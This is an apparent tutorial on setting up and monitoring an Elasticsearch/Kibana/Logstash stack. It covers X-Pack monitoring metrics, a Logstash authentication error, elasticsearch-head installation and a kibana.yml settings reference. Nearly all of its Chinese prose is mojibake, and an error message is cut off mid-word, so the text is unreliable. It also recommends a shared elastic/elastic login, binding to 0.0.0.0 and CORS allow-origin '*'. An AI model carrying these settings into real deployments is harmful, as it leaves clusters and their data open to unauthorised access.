ä½¿ç”¨æƒ…å†µï¼›ç´¢å¼•çº§åˆ«ï¼šIndicesï¼šç´¢å¼•æ•°é‡ï¼Œç›¸å½“äºæ•°æ®åº“æ•°ï¼›Documentsï¼šæ–‡æ¡£æ•°é‡ï¼Œç›¸å½“äºè®°å½•æ•°ï¼›Disk Usageï¼šç£ç›˜ä½¿ç”¨æƒ…å†µï¼›Primary Shardsï¼šåˆ†ç‰‡æ•°ï¼›Replica Shardsï¼šå†—ä½™åˆ†ç‰‡æ•°ï¼›Overviewç›¸è¾ƒäºé›†ç¾¤å¥åº·è§†å›¾ï¼Œè¿™é‡Œçš„æŒ‡æ ‡æ›´å¤šï¼šSerach Rate (/s)ï¼šè¿‘1å°æ—¶çš„æŸ¥è¯¢é€Ÿç‡ï¼ŒQPSï¼›Search Latency (ms)ï¼šè¿‘1å°æ—¶çš„æŸ¥è¯¢å»¶è¿Ÿï¼›Index Rate (/s)ï¼šè¿‘1å°æ—¶çš„ç´¢å¼•é€Ÿç‡ï¼ŒIPSï¼›Index Latency (ms)ï¼šè¿‘1å°æ—¶çš„ç´¢å¼•å»¶è¿Ÿï¼›Shard Activityï¼šå¯¹äº Shard çš„æ“ä½œå†å²ï¼›Indicesç´¢å¼•è§†è§’çš„ç›‘æ§è§†å›¾ï¼ŒåŒ…å«ä»¥ä¸‹æŒ‡æ ‡ï¼šDocument Countï¼šæ–‡æ¡£æ•°ï¼›Dataï¼šæ•°æ®é‡ï¼›Index Rateï¼šç´¢å¼•é€Ÿç‡ï¼›Search Rateï¼šæŸ¥è¯¢é€Ÿç‡ï¼›Unassigned Shardsï¼šæœªåˆ†é…çš„åˆ†ç‰‡æ•°ï¼›ç‚¹å‡» Index Name å¯ä»¥è¿›å…¥æŸ¥çœ‹å¯¹äºç´¢å¼•çš„è¯¦ç»†åŸºç¡€ç›‘æ§ï¼šIndex Memory (KB)ï¼šç´¢å¼•å†…å­˜ä½¿ç”¨ï¼Œåˆ†ä¸º Luceneã€Termã€Pointsï¼›Index Size (MB)ï¼šç´¢å¼•å¤§å°ï¼›Search Rate (/s)ï¼šæŸ¥è¯¢é€Ÿç‡ï¼›Indexing Rate (/s)ï¼šç´¢å¼•é€Ÿç‡ï¼›Segment Countï¼šæ®µæ•°ï¼›Document Countï¼šæ–‡æ¡£æ•°ï¼›Shard Legendï¼šåˆ†ç‰‡çŠ¶æ€å›¾è°±ï¼Œåˆ†ä¸º Primary, Replica,Relocating,Initializing,Unassigned Primary,Unassigned Replica å¤šä¸ªçŠ¶æ€ã€‚ç‚¹å‡» Advanced å¯ä»¥çœ‹åˆ°é«˜çº§ç›‘æ§é¡µé¢ï¼Œè¯·è¯»è€…è‡ªå·±å»æ„Ÿå—ä¸‹ã€‚NodesèŠ‚ç‚¹ç›‘æ§ï¼Œé¦–å…ˆçœ‹åˆ°çš„æ˜¯æ¦‚è¿°æŒ‡æ ‡ï¼šCPU Usage: CPU ä½¿ç”¨ç‡ï¼›Load Averageï¼šCPU å¹³å‡è´Ÿè½½ï¼›JVM Memoryï¼šJVM ä½¿ç”¨æƒ…å†µï¼›Disk Free Spaceï¼šç£ç›˜ç©ºé—²ç©ºé—´ï¼›Shardsï¼šåˆ†ç‰‡æ•°ï¼›ç‚¹å‡»æŸä¸ªèŠ‚ç‚¹æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¯¦ç»†åŸºç¡€ç›‘æ§ï¼šJVM Heap (GB)ï¼šJVM ä½¿ç”¨æƒ…å†µï¼›Index Memory (KB)ï¼šç´¢å¼•å ç”¨å†…å­˜ï¼›CPU Utilization (%)ï¼šCPU ä½¿ç”¨ç‡ï¼›System Loadï¼šç³»ç»Ÿè´Ÿè½½ï¼›Latency (ms)ï¼šå»¶è¿Ÿï¼Œåˆ†ä¸ºç´¢å¼•å’ŒæŸ¥è¯¢ï¼›Segment Countï¼šæ®µæ•°é‡ï¼›Shard Legendï¼šåˆ†ç‰‡çŠ¶æ€å›¾è°±ï¼Œ Primary, Replica,Relocating,Initializingå¤šä¸ªçŠ¶æ€ã€‚ logstash æ•°æ®ä¼ è¾“å‡ºç°é—®é¢˜ï¼š 1Attempted to send a bulk request to Elasticsearch configured at '[\"http://10.11.10.26:9200\"]', but an error occurred and it failed! Are you sure you can reach elasticsearch from this machine using the configuration provided? &#123;:error_message=&gt;\"[401] &#123;\\\"error\\\":&#123;\\\"root_cause\\\":[&#123;\\\"type\\\":\\\"security_exception\\\",\\\"reason\\\":\\\"missing authentication token for REST request [/_bulk]\\\",\\\"header\\\":&#123;\\\"WWW-Authenticate\\\":\\\"Basic realm=\\\\\\\"security\\\\\\\" charset=\\\\\\\"UTF-8\\\\\\\"\\\"&#125;&#125;],\\\"type\\\":\\\"security_exception\\\",\\\"reason\\\":\\\"missing authentication token for REST request [/_bulk]\\\",\\\"header\\\":&#123;\\\"WWW-Authenticate\\\":\\\"Basic realm=\\\\\\\"security\\\\\\\" charset=\\\\\\\"UTF-8\\\\\\\"\\\"&#125;&#125;,\\\"status\\\":401&#125;\", :error_class=&gt;\"Elasticsearch::Transport::Tran å¦å¤–éœ€è¦æ³¨æ„ x-pack çš„æˆæƒä¸€ä¸ªæœˆåä¼šè¿‡æœŸï¼Œæ­¤æ—¶æŸ¥çœ‹ kibana ä¼šæ˜¾ç¤ºï¼š Login is disabled because your license has expired. Please extend your license or disable Security in Elasticsearch. æ­¤æ—¶å¯ä»¥é‡æ–°è·å–ä¸€ä¸ªæˆæƒï¼Œæ¯”å¦‚å…è´¹ç‰ˆæˆæƒï¼Œä½†æ˜¯åŠŸèƒ½æœ‰é˜‰å‰²ã€‚æ›´æ–°æˆæƒçš„æ—¶å€™ï¼Œå¯èƒ½ä¼šå‘ç°æ›´æ–°ä¸ä¼šè¢«ç¡®è®¤ï¼Œè¿™æ˜¯å› ä¸ºéœ€è¦åŠ ä¸Š acknowledge=true å‚æ•°ã€‚ä½¿ç”¨å…è´¹æˆæƒçš„åé—ç—‡å°±æ˜¯åŸºæœ¬çš„å®‰å…¨æ€§æ²¡æœ‰äº†ï¼Œå¯ä»¥ç”¨ Nginx ä»£ç†åšä¸€ä¸ªHTTP Basicè®¤è¯æ¥å¼¥è¡¥. è®¿é—®æ•ˆæœï¼š ç™»å½•éœ€è¦è¾“å…¥è®¤è¯å¯†ç ç»Ÿä¸€ï¼šUsernameï¼šelastic passwordï¼šelastic JVMå †ï¼Œç´¢å¼•å†…å­˜ï¼ˆKBï¼‰ï¼ŒCPUåˆ©ç”¨ç‡ï¼ˆï¼…ï¼‰ï¼Œç³»ç»Ÿè´Ÿè½½ï¼Œå»¶è¿Ÿï¼ˆmsï¼‰ç­‰ç­‰ 1.3 Elasticsearchçš„Headæ’ä»¶Headæ’ä»¶ä½œä¸ºELK 2.xç‰ˆæœ¬ä¸­è¾ƒä¸ºé€šç”¨çš„å‰ç«¯ç®¡ç†æ’ä»¶ï¼Œåœ¨ELK 5.xç‰ˆæœ¬ä¸­æ— æ³•ç›´æ¥ä½¿ç”¨./bin/elasticsearch-plugin install headçš„æ–¹å¼å®‰è£…ï¼Œä½†æ˜¯å¯ä»¥é‡‡å–standaloneçš„æ–¹å¼è¿›è¡Œè¿è¡Œã€‚ å‚è€ƒå®˜æ–¹æ–‡æ¡£ï¼šelasticsearch-head ä¸€ç¯‡è¾ƒå¥½çš„ES 5.xå®‰è£…Headçš„åšæ–‡ï¼š ã€ç‰¹åˆ«æ³¨æ„ã€‘ï¼šæš‚æ—¶æ²¡æœ‰æ‰¾åˆ°x-packå’Œheadç›¸äº’å…¼å®¹çš„æ–¹æ³•ï¼Œç›®å‰ç”±äºè®¤è¯çš„é—®é¢˜ï¼Œå¦‚æœå¯ç”¨äº†x-packçš„secureåŠŸèƒ½ï¼Œä¼šå¯¼è‡´headæ’ä»¶æ— æ³•è¿æ¥ESé›†ç¾¤ã€‚ 12345git clone git://github.com/mobz/elasticsearch-head.gitcd elasticsearch-headnpm installnpm run startopen http://localhost:9100/ ä¿®æ”¹headç›®å½•ä¸‹çš„Gruntfile.jsé…ç½®ï¼Œheadé»˜è®¤ç›‘å¬127.0.0.1 æ–°å¢ï¼šhostname: â€˜0.0.0.0â€™ 12345678910111213# vim Gruntfile.js connect: &#123; server: &#123; options: &#123; hostname: '0.0.0.0', port: 9100, base: '.', keepalive: true &#125; &#125; &#125; &#125;); ä¿®æ”¹elasticsearché…ç½®æ–‡ä»¶ elasticsearch.yml 12http.cors.enabled: truehttp.cors.allow-origin: \"*\" é‡å¯elasticsearchï¼Œå¹¶å¯åŠ¨node 123ln -s /usr/local/elasticsearch-head/node_modules/grunt/bin/grunt /usr/bin/gruntåå°å¯åŠ¨ï¼šgrunt server &amp; è®¿é—®æ•ˆæœï¼š ä¸‰ã€ Elasticsearch-KibanaRPMæ–¹æ³•å®‰è£…å‚è€ƒå®˜ç½‘æ–‡æ¡£ï¼šä½¿ç”¨RPM ç¼–è¾‘å®‰è£…Kibana Running Kibana on Docker: Docker æ­å»ºæ–¹æ³• taræ–¹å¼å®‰è£…Kibana 1234wget https://artifacts.elastic.co/downloads/kibana/kibana-5.5.2-linux-x86_64.tar.gzsha1sum kibana-5.5.2-linux-x86_64.tar.gz tar -xzf kibana-5.5.2-linux-x86_64.tar.gzcd kibana/ 1.1 é€šè¿‡é…ç½®æ–‡ä»¶ç¼–è¾‘é…ç½®Kibanakibana.ymlå¯åŠ¨æ—¶KibanaæœåŠ¡å™¨ä»æ–‡ä»¶è¯»å–å±æ€§ã€‚é»˜è®¤è®¾ç½®é…ç½®Kibanaè¿è¡Œlocalhost:5601ã€‚è¦æ›´æ”¹ä¸»æœºæˆ–ç«¯å£å·ï¼Œæˆ–è€…è¿æ¥åˆ°åœ¨å…¶ä»–æœºå™¨ä¸Šè¿è¡Œçš„Elasticsearchï¼Œæ‚¨éœ€è¦æ›´æ–°kibana.ymlæ–‡ä»¶ã€‚æ‚¨è¿˜å¯ä»¥å¯ç”¨SSLå¹¶è®¾ç½®å„ç§å…¶ä»–é€‰é¡¹ã€‚ kibana.yml å…¨éƒ¨åŸºæœ¬é…ç½® ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171server.port:é»˜è®¤å€¼ï¼š5601 Kibanaç”±åç«¯æœåŠ¡å™¨æä¾›æœåŠ¡ã€‚æ­¤è®¾ç½®æŒ‡å®šè¦ä½¿ç”¨çš„ç«¯å£ã€‚server.host:é»˜è®¤å€¼ï¼šâ€œlocalhostâ€æ­¤è®¾ç½®æŒ‡å®šåç«¯æœåŠ¡å™¨çš„ä¸»æœºã€‚server.basePath:å¦‚æœæ‚¨åœ¨ä»£ç†æœåŠ¡å™¨åé¢è¿è¡Œï¼Œåˆ™å…è®¸æ‚¨æŒ‡å®šå®‰è£…Kibanaçš„è·¯å¾„ã€‚è¿™ä»…å½±å“ç”±Kibanaç”Ÿæˆçš„URLï¼Œæ‚¨çš„ä»£ç†é¢„æœŸåœ¨å°†è¯·æ±‚è½¬å‘ç»™Kibanaä¹‹å‰åˆ é™¤basePathå€¼ã€‚æ­¤è®¾ç½®æ— æ³•ä»¥æ–œæ ï¼ˆ/ï¼‰ç»“å°¾ã€‚server.maxPayloadBytes:é»˜è®¤å€¼ï¼š1048576ä¼ å…¥æœåŠ¡å™¨è¯·æ±‚çš„æœ€å¤§æœ‰æ•ˆè´Ÿè½½å¤§å°ï¼ˆä»¥å­—èŠ‚ä¸ºå•ä½ï¼‰ã€‚server.name:é»˜è®¤å€¼ï¼šâ€œyour-hostnameâ€ç”¨äºæ ‡è¯†æ­¤Kibanaå®ä¾‹çš„äººæ€§åŒ–æ˜¾ç¤ºåç§°ã€‚server.defaultRoute:é»˜è®¤å€¼ï¼šâ€œ/ app / kibanaâ€æ­¤è®¾ç½®æŒ‡å®šæ‰“å¼€Kibanaæ—¶çš„é»˜è®¤è·¯ç”±ã€‚æ‰“å¼€Kibanaæ—¶ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨æ­¤è®¾ç½®ä¿®æ”¹ç€é™†é¡µã€‚elasticsearch.url:é»˜è®¤å€¼ï¼šâ€œhttpï¼š// localhostï¼š9200â€ç”¨äºæ‰€æœ‰æŸ¥è¯¢çš„Elasticsearchå®ä¾‹çš„URLã€‚elasticsearch.preserveHost:é»˜è®¤å€¼ï¼štrueå½“æ­¤è®¾ç½®çš„å€¼ä¸ºçœŸæ—¶ï¼ŒKibanaä½¿ç”¨server.hostè®¾ç½®ä¸­æŒ‡å®šçš„ä¸»æœºåã€‚å½“æ­¤è®¾ç½®çš„å€¼ä¸ºfalseï¼ŒKibanaä½¿ç”¨è¿æ¥åˆ°æ­¤Kibanaå®ä¾‹çš„ä¸»æœºçš„ä¸»æœºåã€‚kibana.index:é»˜è®¤ï¼šâ€œ.kibanaâ€ Kibanaä½¿ç”¨Elasticsearchä¸­çš„ç´¢å¼•æ¥å­˜å‚¨å·²ä¿å­˜çš„æœç´¢ï¼Œå¯è§†åŒ–å’Œä»ªè¡¨æ¿ã€‚å¦‚æœç´¢å¼•ä¸å­˜åœ¨ï¼ŒKibanaå°†åˆ›å»ºä¸€ä¸ªæ–°çš„ç´¢å¼•ã€‚kibana.defaultAppId:é»˜è®¤å€¼ï¼šâ€œdiscoverâ€è¦åŠ è½½çš„é»˜è®¤åº”ç”¨ç¨‹åºã€‚tilemap.url:Kibanaç”¨äºåœ¨tilemapå¯è§†åŒ–ä¸­æ˜¾ç¤ºåœ°å›¾å›¾å—çš„tileæœåŠ¡çš„URLã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ŒKibanaä»å¤–éƒ¨å…ƒæ•°æ®æœåŠ¡è¯»å–æ­¤URLï¼Œä½†ç”¨æˆ·ä»ç„¶å¯ä»¥è¦†ç›–æ­¤å‚æ•°ä»¥ä½¿ç”¨è‡ªå·±çš„Tile Map Serviceã€‚ä¾‹å¦‚ï¼š\"https://tiles.elastic.co/v2/default/&#123;z&#125;/&#123;x&#125;/&#123;y&#125;.png?elastic_tile_service_tos=agree&amp;my_app_name=kibana\"tilemap.options.minZoom:é»˜è®¤å€¼ï¼š1æœ€å°ç¼©æ”¾çº§åˆ«ã€‚tilemap.options.maxZoom:é»˜è®¤å€¼ï¼š10æœ€å¤§ç¼©æ”¾çº§åˆ«ã€‚tilemap.options.attribution:é»˜è®¤å€¼ï¼š\"Â© [Elastic Maps Service](https://www.elastic.co/elastic-maps-service)\"åœ°å›¾å±æ€§å­—ç¬¦ä¸²ã€‚regionmapæŒ‡å®šç”¨äºåŒºåŸŸæ˜ å°„å¯è§†åŒ–çš„å…¶ä»–çŸ¢é‡å›¾å±‚ã€‚æ¯ä¸ªå±‚å¯¹è±¡éƒ½æŒ‡å‘ä¸€ä¸ªå¤–éƒ¨çŸ¢é‡æ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«ä¸€ä¸ªgeojson FeatureCollectionã€‚è¯¥æ–‡ä»¶å¿…é¡»ä½¿ç”¨WGS84åæ ‡å‚è€ƒç³»ï¼Œå¹¶ä¸”åªåŒ…æ‹¬å¤šè¾¹å½¢ã€‚å¦‚æœæ–‡ä»¶æ‰˜ç®¡åœ¨ä¸Kibanaä¸åŒçš„åŸŸä¸Šï¼Œåˆ™æœåŠ¡å™¨éœ€è¦å¯ç”¨CORSï¼Œå› æ­¤Kibanaå¯ä»¥ä¸‹è½½è¯¥æ–‡ä»¶ã€‚urlå­—æ®µä¹Ÿç”¨ä½œæ–‡ä»¶çš„å”¯ä¸€æ ‡è¯†ç¬¦ã€‚æ¯ä¸ªå›¾å±‚å¯ä»¥åŒ…å«å¤šä¸ªå­—æ®µï¼Œä»¥æŒ‡ç¤ºè¦å…¬å¼€çš„geojsonè¦ç´ çš„å“ªäº›å±æ€§ã€‚field.descriptionæ˜¯åœ¨Region Mapå¯è§†åŒ–çš„å­—æ®µèœå•ä¸­æ˜¾ç¤ºçš„äººç±»å¯è¯»æ–‡æœ¬ã€‚ä¹Ÿå¯ä»¥æ·»åŠ å¯é€‰çš„å½’å› å€¼ã€‚ä»¥ä¸‹ç¤ºä¾‹æ˜¾ç¤ºæœ‰æ•ˆçš„regionmapé…ç½®ã€‚regionmapï¼š å±‚ï¼š - åç§°ï¼šâ€œæ³•å›½éƒ¨â€ urlï¼šâ€œhttp://my.cors.enabled.server.org/france_departements.geojsonâ€ å½’å› ï¼šâ€œINRAPâ€ å­—æ®µï¼š - åç§°ï¼šâ€œéƒ¨é—¨â€ è¯´æ˜ï¼šâ€œå…¨éƒ¨åç§°â€ - åç§°ï¼šâ€œINSEEâ€ è¯´æ˜ï¼šâ€œINSEEæ•°å­—æ ‡è¯†ç¬¦â€elasticsearch.username: å’Œ elasticsearch.password:å¦‚æœæ‚¨çš„Elasticsearchå—åˆ°åŸºæœ¬èº«ä»½éªŒè¯çš„ä¿æŠ¤ï¼Œè¿™äº›è®¾ç½®å°†æä¾›KibanaæœåŠ¡å™¨åœ¨å¯åŠ¨æ—¶å¯¹Kibanaç´¢å¼•æ‰§è¡Œç»´æŠ¤æ‰€ç”¨çš„ç”¨æˆ·åå’Œå¯†ç ã€‚æ‚¨çš„Kibanaç”¨æˆ·ä»ç„¶éœ€è¦ä½¿ç”¨é€šè¿‡KibanaæœåŠ¡å™¨ä»£ç†çš„Elasticsearchè¿›è¡Œèº«ä»½éªŒè¯ã€‚server.ssl.enabledé»˜è®¤å€¼ï¼šâ€œfalseâ€å¯ç”¨ä»KibanaæœåŠ¡å™¨åˆ°æµè§ˆå™¨çš„ä¼ å‡ºè¯·æ±‚çš„SSLã€‚å½“è®¾ç½®ä¸ºtrueï¼Œserver.ssl.certificateå¹¶server.ssl.keyè¦æ±‚server.ssl.certificate: å’Œ server.ssl.key:è·¯ç”±åˆ°PEMæ ¼å¼çš„SSLè¯ä¹¦å’ŒSSLå¯†é’¥æ–‡ä»¶ã€‚server.ssl.keyPassphraseå°†ç”¨äºè§£å¯†ç§é’¥çš„å¯†ç çŸ­è¯­ã€‚è¯¥å€¼æ˜¯å¯é€‰çš„ï¼Œå› ä¸ºå¯†é’¥å¯èƒ½æœªè¢«åŠ å¯†ã€‚server.ssl.certificateAuthoritiesåˆ—å‡ºå¯ä¿¡èµ–çš„PEMç¼–ç è¯ä¹¦æ–‡ä»¶çš„è·¯å¾„ã€‚server.ssl.supportedProtocolsé»˜è®¤å€¼ï¼šTLSv1ï¼ŒTLSv1.1ï¼ŒTLSv1.2 æ”¯æŒçš„ç‰ˆæœ¬åè®®ã€‚æœ‰æ•ˆåè®®ï¼šTLSv1ï¼ŒTLSv1.1ï¼ŒTLSv1.2server.ssl.cipherSuitesé»˜è®¤å€¼ï¼šECDHE-RSA-AES128-GCM-SHA256ï¼ŒECDHE-ECDSA-AES128-GCM-SHA256ï¼ŒECDHE-RSA-AES256-GCM-SHA384ï¼ŒECDHE-ECDSA-AES256-GCM-SHA384ï¼ŒDHE-RSA-AES128-GCM- SHA256ï¼ŒECDHE-RSA-AES128-SHA256ï¼ŒDHE-RSA-AES128-SHA256ï¼ŒECDHE-RSA-AES256-SHA384ï¼ŒDHE-RSA-AES256-SHA384ï¼ŒECDHE-RSA-AES256-SHA256ï¼ŒDHE-RSA-AES256-SHA256ï¼Œ HIGHï¼Œï¼aNULLï¼Œï¼eNULLï¼Œï¼EXPORTï¼Œï¼DESï¼Œï¼RC4ï¼Œï¼MD5ï¼Œï¼PSKï¼Œï¼SRPï¼Œï¼CAMELLIAã€‚æ ¼å¼å’Œæœ‰æ•ˆé€‰é¡¹çš„è¯¦ç»†ä¿¡æ¯å¯é€šè¿‡[OpenSSLå¯†ç åˆ—è¡¨æ ¼å¼æ–‡æ¡£]ï¼ˆ https://www.openssl.org/docs/man1.0.2/apps/ciphers.html#CIPHER-LIST-FORMATï¼‰è·å¾—ã€‚elasticsearch.ssl.certificate: å’Œ elasticsearch.ssl.key:æä¾›PEMæ ¼å¼SSLè¯ä¹¦å’Œå¯†é’¥æ–‡ä»¶è·¯å¾„çš„å¯é€‰è®¾ç½®ã€‚è¿™äº›æ–‡ä»¶éªŒè¯æ‚¨çš„Elasticsearchåç«¯ä½¿ç”¨ç›¸åŒçš„å¯†é’¥æ–‡ä»¶ã€‚elasticsearch.ssl.keyPassphraseå°†ç”¨äºè§£å¯†ç§é’¥çš„å¯†ç çŸ­è¯­ã€‚è¯¥å€¼æ˜¯å¯é€‰çš„ï¼Œå› ä¸ºå¯†é’¥å¯èƒ½æœªè¢«åŠ å¯†ã€‚elasticsearch.ssl.certificateAuthorities:å¯é€‰è®¾ç½®ï¼Œä½¿æ‚¨èƒ½å¤ŸæŒ‡å®šElasticsearchå®ä¾‹çš„è¯ä¹¦é¢å‘æœºæ„çš„PEMæ–‡ä»¶çš„è·¯å¾„åˆ—è¡¨ã€‚elasticsearch.ssl.verificationMode:é»˜è®¤å€¼ï¼šfullæ§åˆ¶è¯ä¹¦çš„éªŒè¯ã€‚æœ‰æ•ˆå€¼æ˜¯noneï¼Œcertificateå’Œfullã€‚ fullæ‰§è¡Œä¸»æœºåéªŒè¯ï¼Œcertificateä¸æ‰§è¡Œã€‚elasticsearch.pingTimeout:é»˜è®¤å€¼ï¼šelasticsearch.requestTimeoutè®¾ç½®æ—¶é—´ï¼ˆä»¥æ¯«ç§’ä¸ºå•ä½ï¼‰ç­‰å¾…å¼¹æ€§æœç´¢å“åº”pingçš„å€¼ã€‚elasticsearch.requestTimeout:é»˜è®¤å€¼ï¼š30000ç­‰å¾…åç«¯æˆ–å¼¹æ€§æœç´¢çš„å“åº”çš„æ—¶é—´ï¼ˆæ¯«ç§’ï¼‰ã€‚è¯¥å€¼å¿…é¡»ä¸ºæ­£æ•´æ•°ã€‚elasticsearch.requestHeadersWhitelist:é»˜è®¤å€¼ï¼š[ 'authorization' ]è¦å‘é€åˆ°Elasticsearchçš„Kibanaå®¢æˆ·ç«¯æ ‡é¢˜åˆ—è¡¨ã€‚è¦å‘é€æ²¡æœ‰å®¢æˆ·ç«¯æ ‡é¢˜ï¼Œè¯·å°†æ­¤å€¼è®¾ç½®ä¸º[]ï¼ˆç©ºåˆ—è¡¨ï¼‰ã€‚elasticsearch.customHeaders:é»˜è®¤å€¼ï¼š&#123;&#125;è¦å‘é€åˆ°Elasticsearchçš„æ ‡é¢˜åç§°å’Œå€¼ã€‚æ— è®ºelasticsearch.requestHeadersWhitelisté…ç½®å¦‚ä½•ï¼Œå®¢æˆ·ç«¯å¤´éƒ½ä¸èƒ½è¦†ç›–ä»»ä½•è‡ªå®šä¹‰å¤´æ–‡ä»¶ã€‚elasticsearch.shardTimeout:é»˜è®¤å€¼ï¼š0 Elasticsearchç­‰å¾…åˆ†ç‰‡å“åº”çš„æ—¶é—´ï¼ˆä»¥æ¯«ç§’ä¸ºå•ä½ï¼‰ã€‚è®¾ç½®ä¸º0ä»¥ç¦ç”¨ã€‚elasticsearch.startupTimeout:é»˜è®¤å€¼ï¼š5000é‡è¯•ä¹‹å‰ç­‰å¾…Kibanaå¯åŠ¨æ—¶çš„å¼¹æ€§æœç´¢çš„æ—¶é—´ï¼ˆä»¥æ¯«ç§’ä¸ºå•ä½ï¼‰ã€‚pid.file:æŒ‡å®šKibanaåˆ›å»ºè¿›ç¨‹IDæ–‡ä»¶çš„è·¯å¾„ã€‚logging.dest:é»˜è®¤å€¼ï¼šstdoutå…è®¸æ‚¨æŒ‡å®šKibanaå­˜å‚¨æ—¥å¿—è¾“å‡ºçš„æ–‡ä»¶ã€‚logging.silent:é»˜è®¤å€¼ï¼šfalseå°†æ­¤è®¾ç½®çš„å€¼è®¾ç½®trueä¸ºç¦æ­¢æ‰€æœ‰æ—¥å¿—è¾“å‡ºã€‚logging.quiet:é»˜è®¤å€¼ï¼šfalseå°†æ­¤è®¾ç½®çš„å€¼è®¾ç½®trueä¸ºç¦æ­¢é™¤é”™è¯¯æ¶ˆæ¯ä¹‹å¤–çš„æ‰€æœ‰æ—¥å¿—è¾“å‡ºã€‚logging.verboseé»˜è®¤å€¼ï¼šfalseå°†æ­¤è®¾ç½®çš„å€¼è®¾ç½®ä¸ºtrueè®°å½•æ‰€æœ‰äº‹ä»¶ï¼ŒåŒ…æ‹¬ç³»ç»Ÿä½¿ç”¨æƒ…å†µä¿¡æ¯å’Œæ‰€æœ‰è¯·æ±‚ã€‚ops.intervalé»˜è®¤å€¼ï¼š5000è®¾ç½®é‡‡æ ·ç³»ç»Ÿå’Œè¿›ç¨‹æ€§èƒ½æŒ‡æ ‡çš„é—´éš”ï¼ˆä»¥æ¯«ç§’ä¸ºå•ä½ï¼‰ã€‚æœ€å°å€¼ä¸º100ã€‚status.allowAnonymousé»˜è®¤å€¼ï¼šfalseå¦‚æœå¯ç”¨äº†èº«ä»½éªŒè¯ï¼Œtrueè¯·å°†å…¶è®¾ç½®ä¸ºå…è®¸æœªç»èº«ä»½éªŒè¯çš„ç”¨æˆ·è®¿é—®KibanaæœåŠ¡å™¨çŠ¶æ€APIå’ŒçŠ¶æ€é¡µé¢ã€‚cpu.cgroup.path.overrideè¦†ç›–cgroup cpuè·¯å¾„ï¼Œä»¥ä¸ä¸€è‡´çš„æ–¹å¼å®‰è£… /proc/self/cgroupcpuacct.cgroup.path.overrideåœ¨ä¸ä¸ä¸€è‡´çš„æ–¹å¼å®‰è£…æ—¶ï¼Œè¦†ç›–cgroup cpuacctè·¯å¾„ /proc/self/cgroupconsole.enabledé»˜è®¤å€¼ï¼štrueè®¾ç½®ä¸ºfalseä»¥ç¦ç”¨æ§åˆ¶å°ã€‚åˆ‡æ¢æ­¤æ“ä½œå°†å¯¼è‡´æœåŠ¡å™¨åœ¨ä¸‹æ¬¡å¯åŠ¨æ—¶é‡æ–°ç”Ÿæˆèµ„æºï¼Œè¿™å¯èƒ½ä¼šåœ¨é¡µé¢å¼€å§‹æŠ•æ”¾ä¹‹å‰é€ æˆå»¶è¿Ÿã€‚elasticsearch.tribe.url:ç”¨äºæ‰€æœ‰æŸ¥è¯¢çš„Elasticsearchéƒ¨è½å®ä¾‹çš„å¯é€‰URLã€‚elasticsearch.tribe.username: å’Œ elasticsearch.tribe.password:å¦‚æœæ‚¨çš„Elasticsearchå—åˆ°åŸºæœ¬èº«ä»½éªŒè¯çš„ä¿æŠ¤ï¼Œè¿™äº›è®¾ç½®å°†æä¾›KibanaæœåŠ¡å™¨åœ¨å¯åŠ¨æ—¶å¯¹Kibanaç´¢å¼•æ‰§è¡Œç»´æŠ¤æ‰€ç”¨çš„ç”¨æˆ·åå’Œå¯†ç ã€‚æ‚¨çš„Kibanaç”¨æˆ·ä»ç„¶éœ€è¦ä½¿ç”¨é€šè¿‡KibanaæœåŠ¡å™¨ä»£ç†çš„Elasticsearchè¿›è¡Œèº«ä»½éªŒè¯ã€‚elasticsearch.tribe.ssl.certificate: å’Œ elasticsearch.tribe.ssl.key:æä¾›PEMæ ¼å¼SSLè¯ä¹¦å’Œå¯†é’¥æ–‡ä»¶è·¯å¾„çš„å¯é€‰è®¾ç½®ã€‚è¿™äº›æ–‡ä»¶éªŒè¯æ‚¨çš„Elasticsearchåç«¯ä½¿ç”¨ç›¸åŒçš„å¯†é’¥æ–‡ä»¶ã€‚elasticsearch.tribe.ssl.keyPassphraseå°†ç”¨äºè§£å¯†ç§é’¥çš„å¯†ç çŸ­è¯­ã€‚è¯¥å€¼æ˜¯å¯é€‰çš„ï¼Œå› ä¸ºå¯†é’¥å¯èƒ½æœªè¢«åŠ å¯†ã€‚elasticsearch.tribe.ssl.certificateAuthorities:å¯é€‰è®¾ç½®ï¼Œä½¿æ‚¨èƒ½å¤Ÿä¸ºæ‚¨çš„éƒ¨è½Elasticsearchå®ä¾‹çš„è¯ä¹¦é¢å‘æœºæ„æŒ‡å®šPEMæ–‡ä»¶çš„è·¯å¾„ã€‚elasticsearch.tribe.ssl.verificationMode:é»˜è®¤å€¼ï¼šfullæ§åˆ¶è¯ä¹¦çš„éªŒè¯ã€‚æœ‰æ•ˆå€¼æ˜¯noneï¼Œcertificateå’Œfullã€‚fullæ‰§è¡Œä¸»æœºåéªŒè¯ï¼Œcertificateä¸æ‰§è¡Œã€‚elasticsearch.tribe.pingTimeout:é»˜è®¤å€¼ï¼šelasticsearch.tribe.requestTimeoutè®¾ç½®æ—¶é—´ï¼ˆä»¥æ¯«ç§’ä¸ºå•ä½ï¼‰ç­‰å¾…å¼¹æ€§æœç´¢å“åº”pingçš„å€¼ã€‚elasticsearch.tribe.requestTimeout:é»˜è®¤å€¼ï¼š30000ç­‰å¾…åç«¯æˆ–å¼¹æ€§æœç´¢çš„å“åº”çš„æ—¶é—´ï¼ˆæ¯«ç§’ï¼‰ã€‚è¯¥å€¼å¿…é¡»ä¸ºæ­£æ•´æ•°ã€‚elasticsearch.tribe.requestHeadersWhitelist:é»˜è®¤å€¼ï¼š[ 'authorization' ]è¦å‘é€åˆ°Elasticsearchçš„Kibanaå®¢æˆ·ç«¯æ ‡é¢˜åˆ—è¡¨ã€‚è¦å‘é€æ²¡æœ‰å®¢æˆ·ç«¯æ ‡é¢˜ï¼Œè¯·å°†æ­¤å€¼è®¾ç½®ä¸º[]ï¼ˆç©ºåˆ—è¡¨ï¼‰ã€‚elasticsearch.tribe.customHeaders:é»˜è®¤å€¼ï¼š&#123;&#125;è¦å‘é€åˆ°Elasticsearchçš„æ ‡é¢˜åç§°å’Œå€¼ã€‚æ— 